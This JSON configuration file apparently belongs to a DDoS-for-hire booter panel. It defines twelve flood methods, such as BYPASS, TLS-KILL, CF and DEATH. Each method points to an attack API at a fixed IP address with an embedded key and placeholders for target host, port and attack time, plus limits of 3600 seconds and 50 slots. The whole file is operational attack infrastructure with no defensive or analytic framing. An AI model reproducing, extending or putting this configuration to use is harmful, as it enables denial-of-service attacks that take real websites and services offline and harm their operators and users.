{ 
    "BYPASS": { 
        "api": [ 
            "http://159.65.143.83:7070/api/attack?key=@lizardpredator&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=BYPASS" 
        ], 
        "maxtime": 3600, 
        "network": "vip", 
        "slots": 50 
    }, 
        "BYPASSV2": { 
        "api": [ 
            "http://159.65.143.83:7070/api/attack?key=@lizardpredator&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=BYPASSV2"
        ], 
        "maxtime": 3600, 
        "network": "vip", 
        "slots": 50 
    }, 
        "DEATH": { 
        "api": [ 
            "http://159.65.143.83:7070/api/attack?key=@lizardpredator&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=DEATH"
        ], 
        "maxtime": 3600, 
        "network": "vip", 
        "slots": 50 
    }, 
        "TLS": { 
        "api": [ 
            "http://159.65.143.83:7070/api/attack?key=@lizardpredator&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=TLS"
        ], 
        "maxtime": 3600, 
        "network": "vip", 
        "slots": 50 
    }, 
        "TLS-KILL": { 
        "api": [ 
            "http://159.65.143.83:7070/api/attack?key=@lizardpredator&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=TLS-KILL"
        ], 
        "maxtime": 3600, 
        "network": "vip", 
        "slots": 50 
    }, 
    "MIX": { 
        "api": [ 
            "http://159.65.143.83:7070/api/attack?key=@lizardpredator&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=MIX"
        ], 
        "maxtime": 3600, 
        "network": "vip", 
        "slots": 50 
    }, 
    "STORM": { 
        "api": [ 
            "http://159.65.143.83:7070/api/attack?key=@lizardpredator&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=STORM"
        ], 
        "maxtime": 3600, 
        "network": "vip", 
        "slots": 50 
    }, 
    "POWER": { 
        "api": [ 
            "http://159.65.143.83:7070/api/attack?key=@lizardpredator&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=POWER"
        ], 
        "maxtime": 3600, 
        "network": "vip", 
        "slots": 50 
    }, 
    "HTTP": { 
        "api": [ 
            "http://159.65.143.83:7070/api/attack?key=@lizardpredator&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=HTTP"
        ], 
        "maxtime": 3600, 
        "network": "vip", 
        "slots": 50 
    }, 
    "GLORY": { 
        "api": [ 
            "http://159.65.143.83:7070/api/attack?key=@lizardpredator&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=GLORY"
        ], 
        "maxtime": 3600, 
        "network": "vip", 
        "slots": 50 
    }, 
    "CF": { 
        "api": [ 
            "http://159.65.143.83:7070/api/attack?key=@lizardpredator&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=CF"
        ], 
        "maxtime": 3600, 
        "network": "vip", 
        "slots": 50 
            }, 
    "LEZKILL": { 
        "api": [ 
            "http://159.65.143.83:7070/api/attack?key=@lizardpredator&host=<<$host>>&port=<<$port>>&time=<<$time>>&method=LEZKILL"
        ], 
        "maxtime": 3600, 
        "network": "vip", 
        "slots": 50 
    } 
}